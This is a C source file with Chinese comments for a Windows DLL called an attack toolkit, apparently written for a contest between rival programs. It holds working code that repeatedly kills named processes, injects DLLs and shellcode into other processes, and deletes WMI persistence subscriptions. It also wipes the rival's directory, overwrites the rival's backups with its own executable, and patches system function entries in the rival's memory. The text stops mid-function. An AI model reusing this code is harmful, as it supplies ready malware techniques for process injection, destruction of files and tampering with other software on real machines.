/*
 * atkcore.dll - 精简攻击工具箱
 * 功能：循环扫描并终止 yy.exe / ww.exe
 * 保留五种结束方式：
 *   1. TerminateProcess
 *   2. CreateRemoteThread + ExitProcess
 *   3. 注入 payload.dll
 *   4. 注入 payload.bin（位置无关 shellcode，可绕过签名检查）
 *   5. Job 对象终止
 * 另含：删对手 WMI 复活订阅三件套、杀进程树 + 源文件先锁死再删除、清空对方目录
 * 编译器：GNU GCC (MinGW-w64)
 * 编译选项：-shared -o atkcore.dll killtools.c -luser32 -lkernel32 -ladvapi32
 *           -lole32 -loleaut32 -lwbemuuid -static -s -O2
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM
#include <windows.h>
#include <tlhelp32.h>
#include <wbemidl.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

/* 目标进程名。注意：**只把 yy.exe/ww.exe 当"无条件全杀"的核心目标**。
   lenovo_fix.exe 是 yy 的蜜罐子进程，也是它的复活锚点：我们每 30ms 杀一次、
   它就按 yy 的逻辑重新拉起一次并重建 WMI 订阅（自愈），纯杀是白费力气。
   它归"子进程策略"管：有弹窗 -> 注入进去疯狂嘲讽；没弹窗 -> 才杀。 */
static const WCHAR *g_targets[] = { L"yy.exe", L"ww.exe", NULL };
static const WCHAR *g_hostTargets[] = { L"notepad.exe", NULL };

static BOOL IsTargetName(LPCWSTR name)
{
    if (!name) return FALSE;
    for (int i = 0; g_targets[i]; i++)
        if (_wcsicmp(name, g_targets[i]) == 0) return TRUE;
    return FALSE;
}

/* 对方目录现在是整目录清空（除我方文件名外全部先锁死再删除），
   不再需要按名单逐个删。 */

#define MAX_LOCKS 32
static HANDLE g_hLocks[MAX_LOCKS];
static WCHAR  g_lockPaths[MAX_LOCKS][MAX_PATH];
static volatile LONG g_nLocks = 0;

/* 全局控制 */
static volatile LONG g_bRunning = 0;
static HANDLE g_hThread = NULL;

/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"
static CRITICAL_SECTION g_csLog;
static BOOL g_csLogInit = FALSE;
static HANDLE g_hSharedMap = NULL;
static PVOID  g_pSharedView = NULL;
static HANDLE g_hSingleton = NULL;    /* 进程内单例（持有到进程结束） */
static HMODULE g_hSelfModule = NULL;  /* 自身模块句柄（摘 PEB 链前缓存） */
static WCHAR g_szPayloadCopy[MAX_PATH] = L"";   /* payload.dll 的改名副本 */
static WCHAR g_szPayloadBinCopy[MAX_PATH] = L"";

/* ================== 会话随机名 token（方案 A） ================== */
static ULONGLONG g_dwNameToken = 0;

static ULONGLONG NameTok(void)
{
    if (g_dwNameToken) return g_dwNameToken;
    if (g_pSharedView) {
        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
        if (s) return s;
    }
    return XX_NAME_TOKEN_FIXED;
}

__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock)
{
    ULONGLONG tok = 0;
    if (!XXNameBlockTake(pBlock, &tok, NULL)) return FALSE;
    if (tok) g_dwNameToken = tok;
    return TRUE;
}

/* 方案 A：远程把会话随机名送进目标进程（调用它的 XxSetNames，读完清零并释放）。
   放在 WriteKillLog 之前，所以这里只用返回值不做日志（调用方自己记）。 */
static BOOL GetRemoteExportRva(LPCWSTR localDllPath, const char *funcName, DWORD *pRva)
{
    HMODULE hMap = LoadLibraryExW(localDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    FARPROC pfn;
    if (!hMap) return FALSE;
    pfn = GetProcAddress(hMap, funcName);
    if (!pfn) { FreeLibrary(hMap); return FALSE; }
    *pRva = (DWORD)((ULONG_PTR)pfn - (ULONG_PTR)hMap);
    FreeLibrary(hMap);
    return TRUE;
}

static BOOL PushNamesRemote(HANDLE hProc, HMODULE hRemoteMod, LPCWSTR localDllPath, DWORD pid)
{
    DWORD rva = 0;
    XX_NAME_BLOCK blk, zero;
    LPVOID pBlk;
    HANDLE h;
    BOOL ok = FALSE;

    if (!hProc || !hRemoteMod || !localDllPath || !localDllPath[0]) return FALSE;
    if (!GetRemoteExportRva(localDllPath, "XxSetNames", &rva)) return FALSE;

    XXNameBlockInit(&blk, NameTok(), 0);
    pBlk = VirtualAllocEx(hProc, NULL, sizeof(blk), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBlk) return FALSE;
    if (!WriteProcessMemory(hProc, pBlk, &blk, sizeof(blk), NULL)) {
        VirtualFreeEx(hProc, pBlk, 0, MEM_RELEASE);
        return FALSE;
    }
    h = CreateRemoteThread(hProc, NULL, 0,
                           (LPTHREAD_START_ROUTINE)((BYTE *)hRemoteMod + rva), pBlk, 0, NULL);
    if (h) { WaitForSingleObject(h, 2000); CloseHandle(h); ok = TRUE; }
    memset(&zero, 0, sizeof(zero));
    WriteProcessMemory(hProc, pBlk, &zero, sizeof(zero), NULL);   /* 读后即删 */
    VirtualFreeEx(hProc, pBlk, 0, MEM_RELEASE);
    return ok;
}

static void EnsureLogInit(void)
{
    if (g_csLogInit) return;
    InitializeCriticalSection(&g_csLog);
    g_csLogInit = TRUE;
    g_hSharedMap = XXOpenShared();
    if (g_hSharedMap)
        g_pSharedView = MapViewOfFile(g_hSharedMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
}

/* 详细日志：只写入共享内存（窗口显示） */
static void WriteKillLog(const WCHAR *format, ...)
{
    EnsureLogInit();
    if (!g_csLogInit || !g_pSharedView) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, format);
    _vsnwprintf(szLine, _countof(szLine) - 1, format, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [kill] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    EnterCriticalSection(&g_csLog);
    WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t len = XXLogLen(pLog, maxLen + 1);
    if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }
    size_t newLen = wcslen(entry);
    if (len + newLen <= maxLen)
    {
        /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
        wcscat_s(pLog, maxLen + 1 - len, entry);
    }
    else
    {
        /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
        size_t drop = len + newLen - maxLen;
        if (drop < len) {
            memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
            pLog[len - drop] = L'\0';
        } else {
            pLog[0] = L'\0';
        }
        wcscat_s(pLog, maxLen + 1 - wcslen(pLog), entry);
    }
    LeaveCriticalSection(&g_csLog);
}

/* 结束对方进程后，把它的 exe 和同目录二进制清掉。
   现在统一走"先锁死（删除待决）再删除"：LockThenDeleteFile 逐个文件处理，
   并清空整个敌人目录（见 WipeDirPass）。名单必须拼在"敌人 exe 所在目录"下：
   原来的相对路径删的是当前工作目录（xx 被 window/svcguard 拉起时继承宿主进程
   的 CWD，可能是 System32）。 */

/* ================== 删掉对手的 WMI 复活订阅（三件套全删） ==================
   yy 的复活链是 __EventFilter "YY_RespawnFilter" + CommandLineEventConsumer
   "YY_RespawnConsumer" + 连接两者的 __FilterToConsumerBinding。
   对手自己删我们的订阅时只删了 Filter/Consumer、漏掉 Binding（yybad.md 4.x），
   残留的绑定会继续引用对象，WMI 仓库有时会把对象当成"仍被引用"。
   所以这里三件套都删，顺序必须是 **Binding → Consumer → Filter**，并循环校验。
   另外顺带扫掉所有名字以 YY_ 开头的事件过滤器/消费者（对手换个名字也能盖住）。 */
#define YY_FILTER_NAME   L"YY_RespawnFilter"
#define YY_CONSUMER_NAME L"YY_RespawnConsumer"

static int DeleteWmiInstanceByName(IWbemServices *pSvc, LPCWSTR cls, LPCWSTR name)
{
    WCHAR path[256];
    HRESULT hr;

    _snwprintf(path, _countof(path) - 1, L"%s.Name=\"%s\"", cls, name);
    path[_countof(path) - 1] = L'\0';
    hr = pSvc->lpVtbl->DeleteInstance(pSvc, path, 0, NULL, NULL);
    return SUCCEEDED(hr) ? 1 : 0;
}

/* 扫掉引用了对手 Filter/Consumer 的绑定（含悬空绑定） */
static int DeleteWmiBindings(IWbemServices *pSvc)
{
    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr;
    int n = 0;

    hr = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL",
                                 L"SELECT * FROM __FilterToConsumerBinding",
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 NULL, &pEnum);
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject *pObj = NULL;
        ULONG got = 0;
        while (pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &got) == S_OK && got == 1) {
            VARIANT vF, vC;
            BOOL bEnemy = FALSE;
            VariantInit(&vF);
            VariantInit(&vC);
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"Filter", 0, &vF, NULL, NULL)) &&
                vF.vt == VT_BSTR && vF.bstrVal &&
                (wcsstr(vF.bstrVal, L"YY_") || wcsstr(vF.bstrVal, YY_FILTER_NAME)))
                bEnemy = TRUE;
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"Consumer", 0, &vC, NULL, NULL)) &&
                vC.vt == VT_BSTR && vC.bstrVal &&
                (wcsstr(vC.bstrVal, L"YY_") || wcsstr(vC.bstrVal, YY_CONSUMER_NAME)))
                bEnemy = TRUE;

            if (bEnemy) {
                VARIANT vPath;
                VariantInit(&vPath);
                if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"__RELPATH", 0, &vPath, NULL, NULL)) &&
                    vPath.vt == VT_BSTR && vPath.bstrVal) {
                    if (SUCCEEDED(pSvc->lpVtbl->DeleteInstance(pSvc, vPath.bstrVal, 0, NULL, NULL)))
                        n++;
                }
                VariantClear(&vPath);
            }
            VariantClear(&vF);
            VariantClear(&vC);
            pObj->lpVtbl->Release(pObj);
            pObj = NULL;
        }
        pEnum->lpVtbl->Release(pEnum);
    }
    return n;
}

/* 扫掉名字以 YY_ 开头的事件过滤器 / 消费者（对手改名也躲不掉） */
static int DeleteWmiByPrefix(IWbemServices *pSvc, LPCWSTR cls)
{
    WCHAR query[256];
    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr;
    int n = 0;

    _snwprintf(query, _countof(query) - 1, L"SELECT * FROM %s WHERE Name LIKE 'YY\\_%%'", cls);
    query[_countof(query) - 1] = L'\0';

    hr = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL", query,
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 NULL, &pEnum);
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject *pObj = NULL;
        ULONG got = 0;
        while (pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &got) == S_OK && got == 1) {
            VARIANT vPath;
            VariantInit(&vPath);
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"__RELPATH", 0, &vPath, NULL, NULL)) &&
                vPath.vt == VT_BSTR && vPath.bstrVal) {
                if (SUCCEEDED(pSvc->lpVtbl->DeleteInstance(pSvc, vPath.bstrVal, 0, NULL, NULL)))
                    n++;
            }
            VariantClear(&vPath);
            pObj->lpVtbl->Release(pObj);
            pObj = NULL;
        }
        pEnum->lpVtbl->Release(pEnum);
    }
    return n;
}

static void RemoveEnemyWmi(void)
{
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    HRESULT hr;
    int pass, n = 0;

    /* 模式冲突（RPC_E_CHANGED_MODE）也要继续：宿主进程可能已经按 STA 初始化过 COM */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return;

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void **)&pLoc);
    if (FAILED(hr) || !pLoc) {
        CoUninitialize();
        return;
    }

    /* 必须连 ROOT\SUBSCRIPTION：CommandLineEventConsumer 只定义在这里 */
    hr = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\SUBSCRIPTION", NULL, NULL, NULL, 0,
                                     NULL, NULL, &pSvc);
    if (SUCCEEDED(hr) && pSvc) {
        for (pass = 0; pass < 3; pass++) {
            int d = 0;
            d += DeleteWmiBindings(pSvc);                       /* 1) 先断连接 */
            d += DeleteWmiByPrefix(pSvc, L"CommandLineEventConsumer");
            d += DeleteWmiByPrefix(pSvc, L"__EventFilter");
            d += DeleteWmiInstanceByName(pSvc, L"CommandLineEventConsumer", YY_CONSUMER_NAME);
            d += DeleteWmiInstanceByName(pSvc, L"__EventFilter", YY_FILTER_NAME);
            n += d;
            if (!d) break;                                      /* 没有可删的就收工 */
        }
        pSvc->lpVtbl->Release(pSvc);
    }
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    if (n) WriteKillLog(L"已删除对手 WMI 复活订阅 %d 个对象（Binding/Consumer/Filter 三件套）", n);
}

/* ================== 注入用 payload 副本（改名 + %TEMP%） ==================
   对手按名字拦/删 payload.dll、payload.bin，换成 %TEMP% 下的随机"系统 dll"名即可
   同时绕过反注入名单和删文件名单；副本被删会在下一轮重做。 */
static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid);      /* 前置声明 */
static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);
static void GetKillerPath(WCHAR *buf, SIZE_T size);
static void GetKillerBinPath(WCHAR *buf, SIZE_T size);

static void RefreshKillerCopies(void)
{
    WCHAR src[MAX_PATH];
    DWORD salt = 0x9E3779B9u;

    if (!g_pSharedView) EnsureLogInit();
    if (g_pSharedView) {
        salt = XX_TMP_SALT(g_pSharedView);
        if (salt == 0) salt = 0x9E3779B9u;
    }

    GetKillerPath(src, MAX_PATH);
    if (src[0]) XXMakeTempCopy(src, salt, g_szPayloadCopy, MAX_PATH);

    GetKillerBinPath(src, MAX_PATH);
    if (src[0]) XXMakeTempCopy(src, salt ^ 0x5BD1E995u, g_szPayloadBinCopy, MAX_PATH);
}

/* ================== "先锁死再删除" ==================
   置"删除待决"（FileDispositionInfo）是同时满足两件事的唯一做法：
     - 文件被标记删除后，按名字再打开一律被拒（对手既不能执行也不能改写）；
     - 最后一个句柄关闭时文件即刻消失。
   对正在运行的镜像同样有效：镜像被 section 撑住，进程一退出文件就没了。 */
static BOOL LockThenDeleteFile(LPCWSTR path)
{
    HANDLE h;
    FILE_DISPOSITION_INFO fdi;

    if (!path || !path[0]) return FALSE;

    h = CreateFileW(path, GENERIC_READ | DELETE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        /* 退一步：只带 DELETE 打开（有些文件不允许读但允许删） */
        h = CreateFileW(path, DELETE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (h == INVALID_HANDLE_VALUE) {
        /* 最后兜底：直接删（对没有独占句柄的文件有效） */
        SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileW(path);
    }

    fdi.DeleteFile = TRUE;
    SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi));
    CloseHandle(h);                       /* 关掉最后一个句柄 → 真正删除 */
    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
    return (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) ? TRUE : DeleteFileW(path);
}

/* 我方文件名：清空敌人目录时绝不能顺手删掉自己的东西 */
static const WCHAR *g_ownNames[] = {
    L"xx.exe", L"xxres.bin", L"svcguard.dll", L"window.dll", L"atkcore.dll",
    L"payload.dll", L"payload.bin", L"guard.dll", L"defense.dll", NULL
};

static BOOL IsOwnFileName(LPCWSTR leaf)
{
    int i;
    for (i = 0; g_ownNames[i]; i++)
        if (_wcsicmp(leaf, g_ownNames[i]) == 0) return TRUE;
    return FALSE;
}

/* #19：把对手的自备份文件内容**改写成我方内容**（不是删掉）。
   yy 从 yyres.bin 复活时，还原出来的"自己"其实是 xx.exe 的字节 ——
   它越复活越是在帮我们跑。源用我们自己的 xxres.bin（就是 xx.exe 的备份），
   没准备好就直接用 xx.exe 本体。 */
static void GetOwnDir(WCHAR *dir, SIZE_T cch);      /* 前置声明（定义在下方） */

static BOOL TrojanEnemyBackup(LPCWSTR dir, LPCWSTR leaf)
{
    WCHAR dst[MAX_PATH], src[MAX_PATH], ownDir[MAX_PATH];

    GetOwnDir(ownDir, MAX_PATH);
    if (!ownDir[0]) return FALSE;
    swprintf_s(dst, MAX_PATH, L"%s%s", dir, leaf);
    swprintf_s(src, MAX_PATH, L"%sxxres.bin", ownDir);
    if (GetFileAttributesW(src) == INVALID_FILE_ATTRIBUTES)
        swprintf_s(src, MAX_PATH, L"%sxx.exe", ownDir);
    if (GetFileAttributesW(src) == INVALID_FILE_ATTRIBUTES) return FALSE;

    SetFileAttributesW(dst, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(dst);                 /* 先清掉旧内容（对手可能给它加了占位锁） */
    if (CopyFileW(src, dst, FALSE)) {
        WriteKillLog(L"已把对手备份改写成我方内容: %s", dst);
        return TRUE;
    }
    WriteKillLog(L"改写对手备份失败: %s err=%lu", dst, GetLastError());
    return FALSE;
}

/* 判断是不是对手的备份文件（yyres.bin / yyres*.bin） */
static BOOL IsEnemyBackupName(LPCWSTR leaf)
{
    size_t n = wcslen(leaf);
    if (n < 8) return FALSE;
    if (_wcsnicmp(leaf, L"yyres", 5) != 0) return FALSE;
    return (_wcsicmp(leaf + n - 4, L".bin") == 0);
}

/* 清空敌人目录：逐个文件"先锁死再删除"，自己的文件名跳过；
   对手的自备份则改写成我方内容而不是删除（#19）。 */
static void WipeDirPass(LPCWSTR dir)
{
    WCHAR pattern[MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    int n = 0;

    if (!dir || !dir[0]) return;
    swprintf_s(pattern, MAX_PATH, L"%s*", dir);

    hFind = FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        WCHAR full[MAX_PATH];
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;   /* 只清文件 */
        if (IsOwnFileName(fd.cFileName)) continue;                     /* 别删自己 */
        if (IsEnemyBackupName(fd.cFileName)) {                         /* #19：改写而不是删 */
            if (TrojanEnemyBackup(dir, fd.cFileName)) n++;
            continue;
        }
        swprintf_s(full, MAX_PATH, L"%s%s", dir, fd.cFileName);
        if (LockThenDeleteFile(full)) n++;
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    WriteKillLog(L"清空对方目录: %s 删除 %d 个文件", dir, n);
}

/* 杀死 yy 之后由**新线程**执行：把 yy 目录下所有文件先锁死再删除 */
static DWORD WINAPI WipeEnemyDirThread(LPVOID lp)
{
    WCHAR dir[MAX_PATH];
    if (!lp) return 0;
    wcsncpy_s(dir, MAX_PATH, (LPCWSTR)lp, _TRUNCATE);
    LocalFree(lp);

    Sleep(150);            /* 让"杀进程"先落定，避免对方还在写文件 */
    WipeDirPass(dir);
    Sleep(1200);           /* 对方常在同一目录重建，隔一会儿再清一遍 */
    WipeDirPass(dir);
    return 0;
}

static void SpawnWipeEnemyDir(LPCWSTR exePath)
{
    WCHAR dir[MAX_PATH];
    LPWSTR arg;
    SIZE_T cb;

    if (!exePath || !exePath[0]) return;
    wcsncpy_s(dir, MAX_PATH, exePath, _TRUNCATE);
    {
        WCHAR *p = wcsrchr(dir, L'\\');
        if (p) p[1] = L'\0'; else return;
    }

    cb = (wcslen(dir) + 1) * sizeof(WCHAR);
    arg = (LPWSTR)LocalAlloc(LPTR, cb);
    if (!arg) return;
    memcpy(arg, dir, cb);

    if (!CreateThread(NULL, 0, WipeEnemyDirThread, (LPVOID)arg, 0, NULL))
        LocalFree(arg);
}

/* 收进程树（含自己），最多 MAX_TREE 个 */
#define MAX_TREE 64
typedef struct { DWORD pid; WCHAR path[MAX_PATH]; } TreeEntry;

/* 单个进程的源文件：先锁死（删除待决）再删除 */
static void WipeTreeEntry(TreeEntry *e)
{
    if (!e || !e->path[0]) return;
    if (LockThenDeleteFile(e->path))
        WriteKillLog(L"已锁死并删除源文件: %s", e->path);
    else
        WriteKillLog(L"源文件锁删失败: %s", e->path);
}

static int CollectTree(DWORD rootPid, TreeEntry *out, int max)
{
    int n = 0, i, depth;

    out[n].pid = rootPid;
    out[n].path[0] = L'\0';
    GetProcessPath(rootPid, out[n].path, MAX_PATH);
    n++;

    /* 逐层展开：每轮把"父在树里"的进程收进来（深度上限 6，防环） */
    for (depth = 0; depth < 6 && n < max; depth++) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        int added = 0;
        if (hSnap == INVALID_HANDLE_VALUE) break;
        {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    BOOL bParentInTree = FALSE, bAlready = FALSE;
                    if (n >= max) break;
                    if (pe.th32ProcessID <= 4) continue;
                    for (i = 0; i < n; i++) {
                        if (out[i].pid == pe.th32ProcessID) { bAlready = TRUE; break; }
                        if (out[i].pid == pe.th32ParentProcessID) bParentInTree = TRUE;
                    }
                    if (bAlready || !bParentInTree) continue;
                    out[n].pid = pe.th32ProcessID;
                    out[n].path[0] = L'\0';
                    GetProcessPath(pe.th32ProcessID, out[n].path, MAX_PATH);
                    n++;
                    added++;
                } while (Process32NextW(hSnap, &pe));
            }
        }
        CloseHandle(hSnap);
        if (!added) break;
    }
    return n;
}

/* 杀整棵进程树：先取路径（杀完就取不到），子进程先杀，然后逐个"先锁死再删除"源文件 */
static void KillProcessTree(DWORD rootPid)
{
    TreeEntry tree[MAX_TREE];
    int n, i;

    n = CollectTree(rootPid, tree, MAX_TREE);
    WriteKillLog(L"进程树: 根 PID=%lu 共 %d 个进程", rootPid, n);

    /* 先杀子进程（由深到浅），最后杀根，避免父进程又拉起新的子进程 */
    for (i = n - 1; i >= 0; i--) {
        WCHAR name[MAX_PATH];
        const WCHAR *base = L"unknown";
        if (tree[i].path[0]) {
            const WCHAR *p = wcsrchr(tree[i].path, L'\\');
            base = p ? p + 1 : tree[i].path;
        }
        wcsncpy_s(name, MAX_PATH, base, _TRUNCATE);
        TryAllMethods(name, tree[i].pid);
        if (i != 0) WipeTreeEntry(&tree[i]);   /* 子进程源文件立刻锁死+删除 */
    }

    /* 根进程自己的源文件：清空其目录由新线程负责 */
    if (tree[0].path[0]) {
        WipeTreeEntry(&tree[0]);
        SpawnWipeEnemyDir(tree[0].path);
    }
}

/* ================== 对手进程内存改写（非断点 patch，yybad.md P2） ==================
   做法：在 yy 自己的进程里**改函数入口的机器码**（不写 0xCC，不触发它的 VEH）：
   #16 把 user32!CreateWindowExW 入口改成 `xor eax,eax; ret` → 它再也建不出弹窗
       （弹窗消失 8 秒判负）；连它自己那个 EDIT 日志框也建不出来。
   #17 把 kernel32!TerminateProcess 入口写成 12 字节 `mov rax,0; jmp rax` —— 它的
       ShieldWorker 只备份/还原前 5 字节，还原之后剩下 7 字节仍是我们的垃圾，
       函数被劈坏 → yy 一调 TerminateProcess 就自己崩（再也杀不了我们的人）。

   实测教训：**不要用 IAT patch 做这件事**。我做了对照实验：往目标 IAT 槽里写
   存根（回读确认写入成功）之后，用 -O2 编的目标照样能建窗口 —— 因为编译器把
   导入函数的指针**提前加载进寄存器**，循环里根本不再读 IAT。改函数入口不受此影响。
   系统 dll 的代码页是跨进程共享的（copy-on-write），在这里改只影响 yy 自己，
   不会波及我们和其它进程。 */
typedef struct _ENEMY_MEM {
    HANDLE    hProc;
    ULONG_PTR imageBase;   /* 目标 exe 基址 */
    ULONG_PTR k32Base;     /* 目标里 kernel32 的基址 */
    ULONG_PTR u32Base;     /* 目标里 user32 的基址 */
} ENEMY_MEM;

static BOOL EnemyOpen(DWORD pid, ENEMY_MEM *em)
{
    HANDLE hSnap;
    MODULEENTRY32W me;
    BOOL bWow = FALSE;

    memset(em, 0, sizeof(*em));
    em->hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                            PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!em->hProc) return FALSE;
    if (IsWow64Process(em->hProc, &bWow) && bWow) {   /* 32 位目标：地址体系不同，别碰 */
        CloseHandle(em->hProc);
        em->hProc = NULL;
        return FALSE;
    }

    /* 用 Toolhelp 取模块基址（不额外依赖 psapi） */
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnap == INVALID_HANDLE_VALUE) {
        CloseHandle(em->hProc);
        em->hProc = NULL;
        return FALSE;
    }
    memset(&me, 0, sizeof(me));
    me.dwSize = sizeof(me);
    if (Module32FirstW(hSnap, &me)) {
        do {
            if (em->imageBase == 0) em->imageBase = (ULONG_PTR)me.modBaseAddr;   /* 第一个就是主模块 */
            if (_wcsicmp(me.szModule, L"kernel32.dll") == 0) em->k32Base = (ULONG_PTR)me.modBaseAddr;
            if (_wcsicmp(me.szModule, L"user32.dll") == 0)   em->u32Base = (ULONG_PTR)me.modBaseAddr;
        } while (Module32NextW(hSnap, &me));
    }
    CloseHandle(hSnap);
    return (em->imageBase != 0);
}

static void EnemyClose(ENEMY_MEM *em)
{
    if (!em) return;
    if (em->hProc) CloseHandle(em->hProc);
    em->hProc = NULL;
}

/* 把"本地同名模块里的函数"换算成目标进程里的地址：
   系统 dll 在同一台机器上所有进程里基址相同，但我们仍然显式取目标的模块基址。 */
static ULONG_PTR EnemyFuncAddr(ENEMY_MEM *em, const WCHAR *moduleName, ULONG_PTR remoteBase,
                               const char *funcName)
{
    /* 必须显式 LoadLibrary：宿主里不一定已经加载 user32（链接进来 ≠ 已加载），
       GetModuleHandle 拿到 NULL 会让 RVA 算成 0，等于去改对方模块头，很危险。 */
    HMODULE hLocal = GetModuleHandleW(moduleName);
    ULONG_PTR localBase, localFn;

    if (!hLocal) hLocal = LoadLibraryW(moduleName);
    if (!hLocal || !remoteBase) return 0;
    localBase = (ULONG_PTR)hLocal;
    localFn = (ULONG_PTR)GetProcAddress(hLocal, funcName);
    if (!localFn) return 0;
    return remoteBase + (localFn - localBase);
}

/* 往目标进程某个地址写机器码（自动改保护再还原） */
static BOOL EnemyWriteCode(ENEMY_MEM *em, ULONG_PTR addr, const BYTE *bytes, SIZE_T len)
{
    DWORD old = 0;
    BOOL ok;

    if (!em->hProc || !addr) return FALSE;
    if (!VirtualProtectEx(em->hProc, (LPVOID)addr, len, PAGE_EXECUTE_READWRITE, &old))
        return FALSE;
    ok = WriteProcessMemory(em->hProc, (LPVOID)addr, bytes, len, NULL);
    VirtualProtectEx(em->hProc, (LPVOID)addr, len, old, &old);
    return ok;
}

/* #16：让它在自己进程里再也建不出窗口（无 0xCC，VEH 不触发） */
static BOOL EnemyKillWindowCreation(ENEMY_MEM *em)
{
    static const BYTE retNull[] = { 0x31, 0xC0, 0xC3 };     /* xor eax,eax; ret */
    BOOL ok = FALSE;
    ULONG_PTR a;

    a = EnemyFuncAddr(em, L"user32.dll", em->u32Base, "CreateWindowExW");
    if (a && EnemyWriteCode(em, a, retNull, sizeof(retNull))) {
        WriteKillLog(L"已把对方 CreateWindowExW 入口改成返回 NULL（它再也建不出弹窗）");
        ok = TRUE;
    }
    a = EnemyFuncAddr(em, L"user32.dll", em->u32Base, "CreateWindowExA");
    if (a) EnemyWriteCode(em, a, retNull, sizeof(retNull));
    return ok;
}

/* #17：12 字节 patch 它的 TerminateProcess（对方 ShieldWorker 只还原 5 字节） */
static BOOL EnemyBreakTerminateProcess(ENEMY_MEM *em)
{
    static const BYTE jmpNull[] = { 0x48, 0xB8, 0,0,0,0,0,0,0,0, 0xFF, 0xE0 };
    ULONG_PTR a = EnemyFuncAddr(em, L"kernel32.dll", em->k32Base, "TerminateProcess");
    if (a && EnemyWriteCode(em, a, jmpNull, sizeof(jmpNull))) {
        WriteKillLog(L"已写入 12 字节 TerminateProcess patch（对方只还原前 5 字节 → 函数被劈坏）");
        return TRUE;
    }
    return FALSE;
}

/* 对单个目标做完两种 patch。同一个 PID 只做一次（新 yy 进程 = 新 PID，会重新 patch）；
   节流 500ms 避免 30ms 一轮反复打开进程。 */
#define MAX_PATCHED 8
static DWORD g_patchedPids[MAX_PATCHED];
static int g_nPatched = 0;

static BOOL AlreadyPatched(DWORD pid)
{
    int i;
    for (i = 0; i < g_nPatched; i++)
        if (g_patchedPids[i] == pid) return TRUE;
    return FALSE;
}

static void RememberPatched(DWORD pid)
{
    if (AlreadyPatched(pid)) return;
    if (g_nPatched < MAX_PATCHED) {
        g_patchedPids[g_nPatched++] = pid;
    } else {
        memmove(&g_patchedPids[0], &g_patchedPids[1], sizeof(DWORD) * (MAX_PATCHED - 1));
        g_patchedPids[MAX_PATCHED - 1] = pid;
    }
}

static void PatchEnemyMemory(DWORD pid)
{
    static DWORD s_dwLast = 0;
    DWORD now = GetTickCount();
    ENEMY_MEM em;

    if (pid <= 4 || AlreadyPatched(pid)) return;
    if (s_dwLast && now - s_dwLast < 500) return;
    s_dwLast = now;

    if (!EnemyOpen(pid, &em)) return;
    EnemyKillWindowCreation(&em);        /* #16 */
    EnemyBreakTerminateProcess(&em);     /* #17 */
